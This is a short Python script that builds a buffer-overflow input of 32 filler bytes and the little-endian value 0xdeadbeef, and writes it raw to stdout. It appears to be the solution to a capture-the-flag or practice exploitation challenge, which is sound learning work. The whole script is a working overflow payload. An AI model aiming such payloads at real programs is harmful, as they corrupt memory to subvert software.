import sys

payload = b"A" * 32 + b"\xef\xbe\xad\xde"
#print(str(payload))
sys.stdout.buffer.write(payload)
